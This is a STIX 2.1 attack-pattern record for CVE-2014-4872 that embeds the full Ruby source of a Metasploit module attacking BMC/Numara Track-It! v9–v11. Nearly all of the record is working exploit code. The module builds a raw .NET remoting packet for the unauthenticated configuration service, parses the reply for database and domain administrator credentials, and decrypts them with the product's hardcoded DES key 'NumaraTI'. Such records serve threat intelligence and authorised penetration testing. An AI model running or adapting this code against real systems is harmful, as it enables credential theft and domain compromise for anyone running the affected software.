{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5d647323-e8c5-4030-8c4b-3998ab8a0168",
    "created": "2024-08-14T16:32:25.784919Z",
    "modified": "2024-08-14T16:32:25.784923Z",
    "name": "BMC / Numara Track-It! Domain Administrator and SQL Server User Password Disclosure",
    "description": " This module exploits an unauthenticated configuration retrieval .NET remoting service in Numara / BMC Track-It! v9 to v11.X, which can be abused to retrieve the Domain Administrator and the SQL server user credentials. This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107 10.0.0.143 and 9.0.30.248. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/trackit_sql_domain_creds.rb",
            "external_id": "trackit_sql_domain_creds.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4872"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Oct/34"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'BMC / Numara Track-It! Domain Administrator and SQL Server User Password Disclosure',\n      'Description' => %q{\n        This module exploits an unauthenticated configuration retrieval .NET remoting\n        service in Numara / BMC Track-It! v9 to v11.X, which can be abused to retrieve the Domain\n        Administrator and the SQL server user credentials.\n        This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107,\n        10.0.0.143 and 9.0.30.248.\n      },\n      'Author' =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          [ 'CVE', '2014-4872' ],\n          [ 'OSVDB', '112741' ],\n          [ 'US-CERT-VU', '121036' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Oct/34' ]\n        ],\n      'DisclosureDate' => '2014-10-07'\n    ))\n    register_options(\n      [\n        OptPort.new('RPORT',\n          [true, '.NET remoting service port', 9010])\n      ])\n  end\n\n\n  def prepare_packet(bmc)\n    #\n    # ConfigurationService packet structure:\n    #\n    # packet_header_pre_packet_size\n    # packet_size (4 bytes)\n    # packet_header_pre_uri_size\n    # uri_size (2 bytes)\n    # packet_header_pre_uri\n    # uri\n    # packet_header_post_uri\n    # packet_body_start_pre_method_size\n    # method_size (1 byte)\n    # method\n    # packet_body_pre_type_size\n    # type_size (1 byte)\n    # packet_body_pre_type\n    # type\n    # @packet_terminator\n    #\n    # .NET remoting packet spec can be found at http://msdn.microsoft.com/en-us/library/cc237454.aspx\n    #\n    # P.S.: Lots of fun stuff can be obtained from the response. Highlights include:\n    # - DatabaseServerName\n    # - DatabaseName\n    # - SchemaOwnerDatabaseUser\n    # - EncryptedSystemDatabasePassword\n    # - DomainAdminUserName\n    # - DomainAdminEncryptedPassword\n    #\n    packet_header_pre_packet_size= [\n      0x2e, 0x4e, 0x45, 0x54, 0x01, 0x00, 0x00, 0x00,\n      0x00, 0x00\n    ]\n\n    packet_header_pre_uri_size = [\n      0x04, 0x00, 0x01, 0x01\n    ]\n\n    packet_header_pre_uri = [\n      0x00, 0x00\n    ]\n\n    # contains binary type (application/octet-stream)\n    packet_header_post_uri = [\n      0x06, 0x00, 0x01, 0x01, 0x18, 0x00, 0x00, 0x00,\n      0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74,\n      0x69, 0x6f, 0x6e, 0x2f, 0x6f, 0x63, 0x74, 0x65,\n      0x74, 0x2d, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6d,\n      0x00, 0x00\n    ]\n\n    packet_body_start_pre_method_size = [\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x15, 0x11, 0x00, 0x00, 0x00, 0x12\n    ]\n\n    packet_body_pre_type_size = [ 0x12 ]\n\n    packet_body_pre_type = [ 0x01 ]\n\n    @packet_terminator = [ 0x0b ]\n\n    service = \"TrackIt.Core.ConfigurationService\".gsub(/TrackIt/,(bmc ? \"Trackit\" : \"Numara.TrackIt\"))\n    method = \"GetProductDeploymentValues\".gsub(/TrackIt/,(bmc ? \"Trackit\" : \"Numara.TrackIt\"))\n    type = \"TrackIt.Core.Configuration.IConfigurationSecureDelegator, TrackIt.Core.Configuration, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null\".gsub(/TrackIt/,(bmc ? \"TrackIt\" : \"Numara.TrackIt\"))\n\n    uri = \"tcp://\" + rhost + \":\" + rport.to_s + \"/\" + service\n\n    packet_size =\n      packet_header_pre_uri_size.length +\n      2 + # uri_size\n      packet_header_pre_uri.length +\n      uri.length +\n      packet_header_post_uri.length +\n      packet_body_start_pre_method_size.length +\n      1 + # method_size\n      method.length +\n      packet_body_pre_type_size.length +\n      1 + # type_size\n      packet_body_pre_type.length +\n      type.length\n\n    # start of packet and packet size (4 bytes)\n    buf = packet_header_pre_packet_size.pack('C*')\n    buf << Array(packet_size).pack('L*')\n\n    # uri size (2 bytes)\n    buf << packet_header_pre_uri_size.pack('C*')\n    buf << Array(uri.length).pack('S*')\n\n    # uri\n    buf << packet_header_pre_uri.pack('C*')\n    buf << uri.bytes.to_a.pack('C*')\n    buf << packet_header_post_uri.pack('C*')\n\n    # method name\n    buf << packet_body_start_pre_method_size.pack('C*')\n    buf << Array(method.length).pack('C*')\n    buf << method.bytes.to_a.pack('C*')\n\n    # type name\n    buf << packet_body_pre_type_size.pack('C*')\n    buf << Array(type.length).pack('C*')\n    buf << packet_body_pre_type.pack('C*')\n    buf << type.bytes.to_a.pack('C*')\n\n    buf << @packet_terminator.pack('C*')\n\n    return buf\n  end\n\n\n  def fill_loot_from_packet(packet_reply, loot)\n    loot.each_key { |str|\n      if loot[str] != nil\n        next\n      end\n      if (index = (packet_reply.index(str))) != nil\n        # after str, discard 5 bytes then get str_value\n        size = packet_reply[index + str.length + 5,1].unpack('C*')[0]\n        if size == 255\n          # if we received 0xFF then there is no value for this str\n          # set it to empty but not nil so that we don't look for it again\n          loot[str] = \"\"\n          next\n        end\n        loot[str] = packet_reply[index + str.length + 6, size]\n      end\n    }\n  end\n\n\n  def run\n    packet = prepare_packet(true)\n\n    sock = connect\n    if sock.nil?\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport.to_s} - Failed to connect to remoting service\")\n    else\n      print_status(\"#{rhost}:#{rport} - Sending packet to ConfigurationService...\")\n    end\n    sock.write(packet)\n\n    # type of database (Oracle or SQL Server)\n    database_type = \"DatabaseType\"\n    # Database server name (host\\sid for Oracle or host\\login_name for SQL Server)\n    database_server_name = \"DatabaseServerName\"\n    database_name = \"DatabaseName\"\n    schema_owner = \"SchemaOwnerDatabaseUser\"\n    database_pw = \"EncryptedSystemDatabasePassword\"\n    domain_admin_name = \"DomainAdminUserName\"\n    domain_admin_pw = \"DomainAdminEncryptedPassword\"\n\n    loot = {\n      database_type => nil,\n      database_server_name => nil,\n      database_name => nil,\n      schema_owner => nil,\n      database_pw => nil,\n      domain_admin_name => nil,\n      domain_admin_pw => nil\n    }\n\n    # We only break when we have a timeout (up to 15 seconds wait) or have all we need\n    while true\n      ready = IO.select([sock], nil, nil, 15)\n      if ready\n        packet_reply = sock.readpartial(4096)\n      else\n        print_error(\"#{rhost}:#{rport} - Socket timed out after 15 seconds, try again if no credentials are dumped below.\")\n        break\n      end\n      if packet_reply =~ /Service not found/\n        # This is most likely an older Numara version, re-do the packet and send again.\n        print_error(\"#{rhost}:#{rport} - Received \\\"Service not found\\\", trying again with new packet...\")\n        sock.close\n        sock = connect\n        if sock.nil?\n          fail_with(Failure::Unreachable, \"#{rhost}:#{rport.to_s} - Failed to connect to remoting service\")\n        else\n          print_status(\"#{rhost}:#{rport} - Sending packet to ConfigurationService...\")\n        end\n        packet = prepare_packet(false)\n        sock.write(packet)\n        packet_reply = sock.readpartial(4096)\n      end\n\n      fill_loot_from_packet(packet_reply, loot)\n\n      if not loot.has_value?(nil)\n        break\n      end\n    end\n    sock.close\n\n    # now set the values that were not found back to nil\n    loot.each_key { |str| (loot[str] == \"\" ? loot[str] = nil : next) }\n\n    if loot[database_type]\n      print_good(\"#{rhost}:#{rport} - Got database type: #{loot[database_type]}\")\n    end\n\n    if loot[database_server_name]\n      print_good(\"#{rhost}:#{rport} - Got database server name: #{loot[database_server_name]}\")\n    end\n\n    if loot[database_name]\n      print_good(\"#{rhost}:#{rport} - Got database name: #{loot[database_name]}\")\n    end\n\n    if loot[schema_owner]\n      print_good(\"#{rhost}:#{rport} - Got database user name: #{loot[schema_owner]}\")\n    end\n\n    if loot[database_pw]\n      cipher = OpenSSL::Cipher.new(\"des\")\n      cipher.decrypt\n      cipher.key = 'NumaraTI'\n      cipher.iv = 'NumaraTI'\n      loot[database_pw] = cipher.update(Rex::Text.decode_base64(loot[database_pw]))\n      loot[database_pw] << cipher.final\n      print_good(\"#{rhost}:#{rport} - Got database password: #{loot[database_pw]}\")\n    end\n\n    if loot[domain_admin_name]\n      print_good(\"#{rhost}:#{rport} - Got domain administrator username: #{loot[domain_admin_name]}\")\n    end\n\n    if loot[domain_admin_pw]\n      cipher = OpenSSL::Cipher.new(\"des\")\n      cipher.decrypt\n      cipher.key = 'NumaraTI'\n      cipher.iv = 'NumaraTI'\n      loot[domain_admin_pw] = cipher.update(Rex::Text.decode_base64(loot[domain_admin_pw]))\n      loot[domain_admin_pw] << cipher.final\n      print_good(\"#{rhost}:#{rport} - Got domain administrator password: #{loot[domain_admin_pw]}\")\n    end\n\n    if loot[schema_owner] and loot[database_pw] and loot[database_type] and loot[database_server_name]\n      # If it is Oracle we need to save the SID for creating the Credential Core, else we don't care\n      if loot[database_type] =~ /Oracle/i\n        sid = loot[database_server_name].split('\\\\')[1]\n      else\n        sid = nil\n      end\n\n      credential_core = report_credential_core({\n         password: loot[database_pw],\n         username: loot[schema_owner],\n         sid: sid\n       })\n\n      # Get just the hostname\n      db_address= loot[database_server_name].split('\\\\')[0]\n\n      begin\n        database_login_data = {\n          address: ::Rex::Socket.getaddress(db_address, true),\n          service_name: loot[database_type],\n          protocol: 'tcp',\n          workspace_id: myworkspace_id,\n          core: credential_core,\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }\n\n        # If it's Oracle, use the Oracle port, else use MSSQL\n        if loot[database_type] =~ /Oracle/i\n          database_login_data[:port] = 1521\n        else\n          database_login_data[:port] = 1433\n        end\n        create_credential_login(database_login_data)\n      # Skip creating the Login, but tell the user about it if we cannot resolve the DB Server Hostname\n      rescue SocketError\n        print_error \"Could not resolve Database Server Hostname.\"\n      end\n\n      print_status(\"#{rhost}:#{rport} - Stored SQL credentials: #{loot[database_server_name]}:#{loot[schema_owner]}:#{loot[database_pw]}\")\n    end\n\n    if loot[domain_admin_name] and loot[domain_admin_pw]\n      report_credential_core({\n        password: loot[domain_admin_pw],\n        username: loot[domain_admin_name].split('\\\\')[1],\n        domain: loot[domain_admin_name].split('\\\\')[0]\n      })\n\n      print_status(\"#{rhost}:#{rport} - Stored domain credentials: #{loot[domain_admin_name]}:#{loot[domain_admin_pw]}\")\n    end\n  end\n\n\n  def report_credential_core(cred_opts={})\n    # Set up the has for our Origin service\n    origin_service_data = {\n      address: rhost,\n      port: rport,\n      service_name: 'Domain',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: self.fullname,\n      private_type: :password,\n      private_data: cred_opts[:password],\n      username: cred_opts[:username]\n    }\n\n    if cred_opts[:domain]\n      credential_data.merge!({\n        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n        realm_value: cred_opts[:domain]\n      })\n    elsif cred_opts[:sid]\n      credential_data.merge!({\n         realm_key: Metasploit::Model::Realm::Key::ORACLE_SYSTEM_IDENTIFIER,\n         realm_value: cred_opts[:sid]\n       })\n    end\n\n    credential_data.merge!(origin_service_data)\n    create_credential(credential_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-07"
}